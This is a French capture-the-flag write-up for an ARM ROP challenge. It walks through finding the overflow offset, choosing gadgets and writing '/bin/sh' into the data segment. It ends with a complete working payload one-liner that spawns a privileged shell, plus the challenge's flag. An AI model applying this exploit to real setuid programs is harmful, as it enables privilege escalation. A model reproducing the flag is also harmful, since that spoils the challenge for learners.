## ELF ARM - Basic ROP

Dans ce challenge, nous devons exploiter le binaire afin de lire le ficher .passwd avec les bons droits.
Pour ce faire nous devons réaliser une ROP chain.

Pour commencer voici les protections du binaire:

- RelRO 	Read Only relocations
- NX 	Pile non exécutable
- ASLR 	Distribution aléatoire de l'espace d'adressage
- Pas d'access au code source

Ici il y a l'ASLR ce qui signifie que nous ne pouvons utiliser des gadgets uniquement de notre binaire et non des librairies externes car nous ne connaissons pas leurs adresses.

Tout d'abord essayons de faire crash notre binaire :

<img src="/writeups-img/arm-01-crash.png" alt="Crash du binaire — segmentation fault" />

En analysant dans gdb et en utilisant un pattern create de 100 :

<img src="/writeups-img/arm-02-gdb-offset.png" alt="Analyse gdb — contrôle de $pc à l'offset 69" />

On controle donc $pc à partir de l'offset 69.

Voila qui est déja un bon début.
Analysons davantage le binaire pour ce que nous pouvons faire pour l'exploiter à notre avantage.

En faisant nm ch46 on peut voir toutes les fonctions chargées dans le binaire dont une qui est très intéressante : exec.

<img src="/writeups-img/arm-03-disas-exec.png" alt="Désassemblage de la fonction exec (geteuid, setreuid, system)" />

Cette fonction fait appel au combo geteuid et setreuid, et appelle ensuiste system. 
C'EST PARFAIT.

Maintenant nous devons nous débrouiller pour donner à exec le bon argument comme par exemple un char* sur "/bin/sh".
Evidemment le string /bin/sh n'est pas présent dans le binaire, et nous devons donc trouver le moyen de l'écrire quelque part en mémoire et passer cette adresse à exec.

Pour commencer, examinons la zone mémoire possible à exploiter pour ceci :

<img src="/writeups-img/arm-04-vmmap.png" alt="vmmap — cartographie mémoire du processus" />

<img src="/writeups-img/arm-05-data-hexdump.png" alt="Segment .data — nombreux octets nuls disponibles" />

<img src="/writeups-img/arm-06-data-page.png" alt="Détail de la page .data (0x00021000)" />

Nous allons pouvoir écrire notre string ici, dans le segement data de notre binaire, il y a énormément d'octets de disponibles.

Allons désormais trouver les gadgets à l'aide de ROPgadget :

<img src="/writeups-img/arm-07-ropgadget-pop.png" alt="Gadgets pop {r3, pc} et pop {r4, pc}" />

0x00010598 : pop {r4, pc} et 0x00010410 : pop {r3, pc} nous serons très utile, on les garde de coté.

<img src="/writeups-img/arm-08-ropgadget-strb.png" alt="Gadget strb r3, [r4] ; pop {r4, pc}" />

Le gadget 0x00010594 : strb r3, [r4] ; pop {r4, pc} est parfait il nous permettra d'écrire à l'adresse spcécifiée dans r4.

<img src="/writeups-img/arm-09-ropgadget-mov.png" alt="Gadget mov r0, r3 ; pop {fp, pc}" />

0x00010654 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}} Ce gadget est parfait aussi, il nous permettra de mettre la valeur de r3 and r0 comme l'adresse de /bin/sh.

Voici comment la ROP se dessine:

  1. Tout d'abord utlisons le gadget pop r4, afin de lui spécifier l'adresse où notre string /bin/sh commancera
  2. Nous fournissons l'addresse en question
  3. Nous utilisons le pop r3, pour pouvoir indiquer quoi écrire dedans.
  4. Nous fournissons le caractère à écrire.
  5. Nous utilisons le gadget strb qui va écrire le BYTE le moins fort de r3 à l'adresse de r4
  6. Nous revenons à l'étape 2 directement car le strb se termine par un pop r4.

L'idée est donc d'utiliser une seule fois le pop r4 puis de faire une boucle de l'étape 2 à 5 jusqu'à avoir écrit /bin/sh.

Une fois que nous avons écrit /bin/sh nous utilisons le gadget pop r3 suivi du gadget mov r0, r3 afin de fournir à r0 l'adresse /bin/sh. Ce gadget se termine par un pop r11, Or nous pouvons controler r11 également. Son offset est situé juste avant $pc.
Afin de rediriger le programme sur exec, nous devons donc fournir à r11 un pointeur sur l'adresse de exec + 4 (afin d'éviter toute corruption de stack avec les push du début). 
L'idée est donc d'encore une fois utiliser la même logique précédente avec les gadgets mais cette fois pour écrire dans la zone data l'adresse de exec + 4. Biensur il faut faire cela avant de mov r0, r3.

Attention à bien espacer également l'adresse du string /bin/sh de celle d'exec + 4 afin d'éviter tout comportement indésirable lié au stack pointeur et les overwrite lors de l'execution du binaire.

Notre payload ressemble donc à ceci :

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa' + b'\x90\x15\x02\x00' + b'\x98\x05\x01\x00' + b'\x50\x16\x02\x00' + b'\x10\x04\x01\x00' + b'////' + b'\x94\x05\x01\x00' + b'\x51\x16\x02\x00' + b'\x10\x04\x01\x00' + b'bbbb' + b'\x94\x05\x01\x00' + b'\x52\x16\x02\x00' + b'\x10\x04\x01\x00' + b'iiii' + b'\x94\x05\x01\x00' + b'\x53\x16\x02\x00' + b'\x10\x04\x01\x00' + b'nnnn' + b'\x94\x05\x01\x00' + b'\x54\x16\x02\x00' + b'\x10\x04\x01\x00' + b'////' + b'\x94\x05\x01\x00' + b'\x55\x16\x02\x00' + b'\x10\x04\x01\x00' + b'ssss' + b'\x94\x05\x01\x00' + b'\x56\x16\x02\x00' + b'\x10\x04\x01\x00' + b'hhhh' + b'\x94\x05\x01\x00' + b'\x90\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\xa8\xa8\xa8\xa8' + b'\x94\x05\x01\x00'+ b'\x91\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\x05\x05\x05\x05' + b'\x94\x05\x01\x00'+ b'\x92\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\x01\x01\x01\x01' + b'\x94\x05\x01\x00' + b'\x93\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\x00\x00\x00\x00' + b'\x94\x05\x01\x00' + b'ffff' + b'\x10\x04\x01\x00' + b'\x50\x16\x02\x00' + b'\x54\x06\x01\x00' + b'\n'"
```

En l'exécutant, la ROP chain écrit `/bin/sh` dans le segment data puis redirige l'exécution vers `exec`, ce qui donne un shell avec les droits du binaire et permet de lire le fichier `.passwd` :

<img src="/writeups-img/arm-10-shell-flag.png" alt="Exécution du payload — shell obtenu et lecture du .passwd" />

## Flag

```
ARM_b4by_ROP_to_warm_up
```
